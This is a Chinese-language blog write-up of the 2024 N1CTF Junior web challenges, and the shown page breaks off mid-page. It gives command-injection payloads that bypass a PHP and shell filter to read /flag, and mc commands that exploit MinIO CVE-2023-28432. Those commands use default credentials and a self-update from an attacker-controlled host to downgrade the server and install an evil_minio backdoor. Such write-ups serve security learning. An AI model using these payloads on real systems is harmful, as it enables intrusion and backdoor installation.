<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>2024 N1CTF Junior Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="2024 N1CTF Junior Web Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-05T07:51:08.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>5,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">2024 N1CTF Junior Web Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="名称-x2F-排名情况"><a href="#名称-x2F-排名情况" class="headerlink" title="名称&#x2F;排名情况"></a>名称&#x2F;排名情况</h1><p>Boogipop: Rank 1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707069401465-7fb4e848-a57b-4785-885e-3aa643e45554.png#averageHue=%230a3154&clientId=ua5ca646f-42d6-4&from=paste&height=748&id=ufbff04ef&originHeight=935&originWidth=1774&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1043185&status=done&style=none&taskId=u09448d9b-addf-4061-8345-77edb63bb71&title=&width=1419.2" alt="image.png"><br>也是比较意外拿了个第一，各个题目都做的挺顺利（因为有hint</p>
<h1 id="zako"><a href="#zako" class="headerlink" title="zako"></a>zako</h1><p>虽然是个签到题，但这确实是我做的最久的题了<br>emmmmm，这个wp也就只有审核可以看到了，这里就说一下我蠢到极致的解法吧，首先我们可以获取execute.sh的内容如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">reject() &#123;</span><br><span class="line">    echo &quot;$&#123;1&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">XXXCMD=$1</span><br><span class="line"></span><br><span class="line">awk -v str=&quot;$&#123;XXXCMD&#125;&quot; &#x27;</span><br><span class="line">BEGIN &#123;</span><br><span class="line">    deny=&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;;</span><br><span class="line">    for (i = 1; i &lt;= length(str); i++) &#123;</span><br><span class="line">        char = substr(str, i, 1);</span><br><span class="line"></span><br><span class="line">        for (x = 1; x &lt; length(deny) + 1; x++) &#123;</span><br><span class="line">            r = substr(deny, x, 1);</span><br><span class="line">            if (char == r) exit 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br><span class="line"></span><br><span class="line">[ $? -ne 0 ] &amp;&amp; reject &quot;NOT ALLOW 1&quot;</span><br><span class="line"></span><br><span class="line">eval_cmd=$(echo &quot;$&#123;XXXCMD&#125;&quot; | awk -F &quot;|&quot; &#x27;</span><br><span class="line">BEGIN &#123;</span><br><span class="line">    allows[1] = &quot;ls&quot;;</span><br><span class="line">    allows[2] = &quot;makabaka&quot;;</span><br><span class="line">    allows[3] = &quot;whoareu&quot;;</span><br><span class="line">    allows[4] = &quot;cut~no&quot;;</span><br><span class="line">    allows[5] = &quot;grep&quot;;</span><br><span class="line">    allows[6] = &quot;wc&quot;;</span><br><span class="line">    allows[7] = &quot;杂鱼杂鱼&quot;;</span><br><span class="line">    allows[8] = &quot;netstat.jpg&quot;;</span><br><span class="line">    allows[9] = &quot;awsl&quot;;</span><br><span class="line">    allows[10] = &quot;dmesg&quot;;</span><br><span class="line">    allows[11] = &quot;xswl&quot;;</span><br><span class="line">&#125;&#123;</span><br><span class="line">    num = 1;</span><br><span class="line">    for (i = 1; i &lt;= NF; i++) &#123;</span><br><span class="line">        for (x = 1; x &lt;= length(allows); x++) &#123;</span><br><span class="line">            cmpstr = substr($i, 1, length(allows[x]));</span><br><span class="line">            if (cmpstr == allows[x])</span><br><span class="line">                eval_cmd[num++] = $i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">END &#123;</span><br><span class="line">    for (i = 1; i &lt;= length(eval_cmd); i++) &#123;</span><br><span class="line">        if (i != 1)</span><br><span class="line">            printf &quot;| %s&quot;, eval_cmd[i];</span><br><span class="line">        else</span><br><span class="line">            printf &quot;%s&quot;, eval_cmd[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[ &quot;$&#123;XXXCMD&#125;&quot; = &quot;&quot; ] &amp;&amp; reject &quot;NOT ALLOW 2&quot;</span><br><span class="line"></span><br><span class="line">eval $&#123;eval_cmd&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个sh脚本，其实所做的内容也很简单，设置了11个白名单<br>其实有用的也就3个<code>wc、ls、grep</code></p>
<ul>
<li>wc：查看文件行数情况，不可以读取内容</li>
<li>grep：可读取文件内容</li>
<li>ls：不多说</li>
</ul>
<p>其次还设置了一个shell环境下的黑名单<code>deny=&quot;</code>;&amp;$(){}[]!@#$%^&amp;*-“;<code>，过滤了一些特殊字符。源码没了，感谢</code>@蒋十七&#96;师傅的源码提供，阿里嘎多。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//something hide here</span></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat &quot;</span>.<span class="keyword">__FILE__</span>.<span class="string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&gt;<span class="number">70</span>) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;no, &gt;70&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;你就不能绕一下喵&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们可以使用ls指令查看当前所有文件。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707070422946-ba2a93ab-077f-48d8-8049-9502674aab57.png#averageHue=%23cbcbca&clientId=ua5ca646f-42d6-4&from=paste&height=673&id=ue5decca1&originHeight=841&originWidth=1438&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55339&status=done&style=none&taskId=ucbd95a5c-f8d4-4dd9-a17a-458c666b66c&title=&width=1150.4" alt="image.png"><br>并且可以使用grep 进行文件读取<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707070450509-ac383d77-6fbb-49bc-a905-8415702d8a04.png#averageHue=%23c3c2c1&clientId=ua5ca646f-42d6-4&from=paste&height=678&id=u0fffc40b&originHeight=847&originWidth=1471&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94237&status=done&style=none&taskId=u7b59eb75-f0d4-4cae-9add-90c7c6348f3&title=&width=1176.8" alt="image.png"><br>当然flag是不可能被读出来的，接下里就是我的铸币解法了。先说一下思路，我认为这道题php有waf1，shell中有waf2，硬绕waf1 2我觉得我是不行，但是但凡少其中一个waf我都可以做出来，因此想法油然而生了。<br>我要将如下内容写入pop.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;__secret.xswl.io&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;./execute.sh &#x27;&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样我就可以避免外层waf了。实现起来也很简单，依次进行如下操作</p>
<ul>
<li><code>?.[secret.xswl.io=grep &quot;&lt;?php&quot; inde?.php &gt;&gt; pop.php</code></li>
<li><code>?.[secret.xswl.io=grep &quot;cmd&quot; inde?.php &gt;&gt; pop.php</code></li>
<li><code>?.[secret.xswl.io=grep &quot;system&quot; inde?.php &gt;&gt; pop.php</code></li>
</ul>
<p>然后读取一下pop.php的内容。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707070689447-0eb614ca-b7a5-44c9-944b-aa14cc6ab0b9.png#averageHue=%23aa8564&clientId=ua5ca646f-42d6-4&from=paste&height=179&id=u532e17a2&originHeight=224&originWidth=969&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15483&status=done&style=none&taskId=u45b98010-102a-4210-815a-f790cc5e5ec&title=&width=775.2" alt="image.png"><br>好了大功告成，那么最后的payload就是<br><code>?.[secret.xswl.io=ls&#39;;cat /flag&#39;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707070747480-121ead21-15ec-411e-af0f-e1040dc2f20a.png#averageHue=%23cdcdcc&clientId=ua5ca646f-42d6-4&from=paste&height=664&id=u1958363a&originHeight=830&originWidth=1111&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48046&status=done&style=none&taskId=ub49927b7-c1ff-4122-b8f6-7a0facd864e&title=&width=888.8" alt="image.png"></p>
<h1 id="ezminio"><a href="#ezminio" class="headerlink" title="ezminio"></a>ezminio</h1><p>还好最后一小时放了hint，不然到死都没想到这个思路，其实我感觉这个思路很不，Lolita师傅太强拉<br>CVE-2023-28432<br><a target="_blank" rel="noopener" href="https://github.com/AbelChe/evil_minio">https://github.com/AbelChe/evil_minio</a><br>这是去年三月份出的漏洞，原理就是minio 信息泄露拿到管理员账号密码，进而可以自更新rce。但是利用有个前提条件，那就是不能在环境变量配置minisignPubKey，否则会进入verifyBinary检查sha256。那么就不可以自更新rce了。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	<span class="comment">// Update this whenever the official minisign pubkey is rotated.</span></span><br><span class="line">	defaultMinisignPubkey = <span class="string">&quot;RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">verifyBinary</span><span class="params">(u *url.URL, sha256Sum []<span class="type">byte</span>, releaseInfo, mode <span class="type">string</span>, reader io.Reader)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> !updateInProgress.CompareAndSwap(<span class="number">0</span>, <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> errors.New(<span class="string">&quot;update already in progress&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> updateInProgress.Store(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	transport := getUpdateTransport(<span class="number">30</span> * time.Second)</span><br><span class="line">	opts := selfupdate.Options&#123;</span><br><span class="line">		Hash:     crypto.SHA256,</span><br><span class="line">		Checksum: sha256Sum,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := opts.CheckPermissions(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">			Code:       AdminUpdateApplyFailure,</span><br><span class="line">			Message:    fmt.Sprintf(<span class="string">&quot;server update failed with: %s, do not restart the servers yet&quot;</span>, err),</span><br><span class="line">			StatusCode: http.StatusInternalServerError,</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	minisignPubkey := env.Get(envMinisignPubKey, defaultMinisignPubkey)</span><br><span class="line">	<span class="keyword">if</span> minisignPubkey != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		v := selfupdate.NewVerifier()</span><br><span class="line">		u.Path = path.Dir(u.Path) + slashSeparator + releaseInfo + <span class="string">&quot;.minisig&quot;</span></span><br><span class="line">		<span class="keyword">if</span> err = v.LoadFromURL(u.String(), minisignPubkey, transport); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">				Code:       AdminUpdateApplyFailure,</span><br><span class="line">				Message:    fmt.Sprintf(<span class="string">&quot;signature loading failed for %v with %v&quot;</span>, u, err),</span><br><span class="line">				StatusCode: http.StatusInternalServerError,</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		opts.Verifier = v</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err = selfupdate.PrepareAndCheckBinary(reader, opts); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> pathErr *os.PathError</span><br><span class="line">		<span class="keyword">if</span> errors.As(err, &amp;pathErr) &#123;</span><br><span class="line">			<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">				Code: AdminUpdateApplyFailure,</span><br><span class="line">				Message: fmt.Sprintf(<span class="string">&quot;Unable to update the binary at %s: %v&quot;</span>,</span><br><span class="line">					filepath.Dir(pathErr.Path), pathErr.Err),</span><br><span class="line">				StatusCode: http.StatusForbidden,</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">			Code:       AdminUpdateApplyFailure,</span><br><span class="line">			Message:    err.Error(),</span><br><span class="line">			StatusCode: http.StatusInternalServerError,</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是题目版本对应的verifyBinary函数逻辑，可以看到传入了一个publickey进行校验。并且publickey怎么样都是有个值的。<br>这导致我们无法自更新二开后的minio 二进制文件。那怎么办呢？<br>这里其实就引入了一个二次思维，我们先将版本退化为不需要校验publickey的版本，然后再上传我们的evil_minio，这样就可以绕过这个机制了<br>这是2023-2月版本的verrifyBinary方法：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">verifyBinary</span><span class="params">(u *url.URL, sha256Sum []<span class="type">byte</span>, releaseInfo <span class="type">string</span>, mode <span class="type">string</span>, reader []<span class="type">byte</span>)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> !atomic.CompareAndSwapUint32(&amp;updateInProgress, <span class="number">0</span>, <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> errors.New(<span class="string">&quot;update already in progress&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> atomic.StoreUint32(&amp;updateInProgress, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	transport := getUpdateTransport(<span class="number">30</span> * time.Second)</span><br><span class="line">	opts := selfupdate.Options&#123;</span><br><span class="line">		Hash:     crypto.SHA256,</span><br><span class="line">		Checksum: sha256Sum,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := opts.CheckPermissions(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">			Code:       AdminUpdateApplyFailure,</span><br><span class="line">			Message:    fmt.Sprintf(<span class="string">&quot;server update failed with: %s, do not restart the servers yet&quot;</span>, err),</span><br><span class="line">			StatusCode: http.StatusInternalServerError,</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	minisignPubkey := env.Get(envMinisignPubKey, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> minisignPubkey != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		v := selfupdate.NewVerifier()</span><br><span class="line">		u.Path = path.Dir(u.Path) + slashSeparator + releaseInfo + <span class="string">&quot;.minisig&quot;</span></span><br><span class="line">		<span class="keyword">if</span> err = v.LoadFromURL(u.String(), minisignPubkey, transport); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">				Code:       AdminUpdateApplyFailure,</span><br><span class="line">				Message:    fmt.Sprintf(<span class="string">&quot;signature loading failed for %v with %v&quot;</span>, u, err),</span><br><span class="line">				StatusCode: http.StatusInternalServerError,</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		opts.Verifier = v</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err = selfupdate.PrepareAndCheckBinary(bytes.NewReader(reader), opts); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> pathErr *os.PathError</span><br><span class="line">		<span class="keyword">if</span> errors.As(err, &amp;pathErr) &#123;</span><br><span class="line">			<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">				Code: AdminUpdateApplyFailure,</span><br><span class="line">				Message: fmt.Sprintf(<span class="string">&quot;Unable to update the binary at %s: %v&quot;</span>,</span><br><span class="line">					filepath.Dir(pathErr.Path), pathErr.Err),</span><br><span class="line">				StatusCode: http.StatusForbidden,</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> AdminError&#123;</span><br><span class="line">			Code:       AdminUpdateApplyFailure,</span><br><span class="line">			Message:    err.Error(),</span><br><span class="line">			StatusCode: http.StatusInternalServerError,</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在这里假如环境变量中没有配置publickey那么就默认为空，也就绕过了判断。这就符合我们的条件了。在题目环境中环境变量是没配置publickey的，不然也打不了。<br>题目给的是内网9000端口映射出的服务<br><a target="_blank" rel="noopener" href="http://47.112.112.23:23333/">http://47.112.112.23:23333</a><br>我们利用mc 管理工具将其添加进我们的host<br><code>mc config host add minio [http://47.112.112.23:23333](http://47.112.112.23:23333) minioadmin minioadmin</code><br>目标是默认密码和用户名，权限也是admin，有自更新权限，首先是降级处理。这里我选用的版本是<code>[minio.RELEASE.2023-02-10T18-48-39Z](https://dl.min.io/server/minio/release/linux-amd64/archive/minio.RELEASE.2023-02-10T18-48-39Z)</code><br><a target="_blank" rel="noopener" href="https://dl.min.io/server/minio/release/linux-amd64/archive/">https://dl.min.io/server/minio/release/linux-amd64/archive/</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707071716925-aa13f070-fead-4418-a1fe-a2c59cf21a34.png#averageHue=%23f8f5f5&clientId=ua5ca646f-42d6-4&from=paste&height=724&id=u2523a03c&originHeight=905&originWidth=1670&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=234882&status=done&style=none&taskId=u73786566-5ae6-403b-bef3-21b09c064be&title=&width=1336" alt="image.png"><br>我们需要这三个文件，下载下来后先给他改个名字，自更新判断的是sha256sum文件的第二个字段。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707071756613-c313d1e4-27b6-412d-b028-507e3835492a.png#averageHue=%23a69b8f&clientId=ua5ca646f-42d6-4&from=paste&height=158&id=u62386f2f&originHeight=197&originWidth=1121&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14148&status=done&style=none&taskId=udf1e4f03-bcba-46ff-8e50-8ea688db3ba&title=&width=896.8" alt="image.png"><br>假如这个字段的版本小于服务器当前的版本，那么就不会自更新，所以我们随便将其改为另一个名字<code>minio.RELEASE.2024-01-15T18-25-24Z</code>，并且将sha256sum文件以及内容也改为如上的名字，之后我们就可以开启自更新了。<br><code>mc admin update minio [http://8.134.166.14:8887/minio.RELEASE.2024-01-15T18-25-24Z.sha256sum](http://8.134.166.14:8887/minio.RELEASE.2024-01-15T18-25-24Z.sha256sum) -y</code><br>等待大概四分钟，我们就可以看到更新成功。（我服务器是真屎啊，95M传四分钟）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072066396-578c73b6-ca27-4672-bd35-4e4a2ea2ff70.png#averageHue=%23383733&clientId=ua5ca646f-42d6-4&from=paste&height=123&id=uc181eed4&originHeight=154&originWidth=1124&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41810&status=done&style=none&taskId=u71b77623-0f21-4cbf-bba8-a4bee04b411&title=&width=899.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707072070378-cc83b619-0575-4c82-946f-20a9abf03bf4.png#averageHue=%23020100&clientId=ua5ca646f-42d6-4&from=paste&height=170&id=u1b26bbeb&originHeight=213&originWidth=1091&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19799&status=done&style=none&taskId=u16f15f31-f38a-4bfc-a5e6-3ef79fa2d38&title=&width=872.8" alt="image.png"><br>接下来我们该做的就是二次更新替换为evil_minio<br>编译该项目即可<a target="_blank" rel="noopener" href="https://github.com/AbelChe/evil_minio">https://github.com/AbelChe/evil_minio</a><br>然后也是一样的处理，修改名字为超过当前版本的版本即可。这个可以不需要minisig文件，因为绕过了verifyBinary。<br><code>mc admin update minio [http://8.134.166.14:8886/minio.RELEASE.2024-01-16T18-25-24Z.sha256sum](http://8.134.166.14:8886/minio.RELEASE.2024-01-16T18-25-24Z.sha256sum) -y</code><br>同样也是等待四分钟<br><img 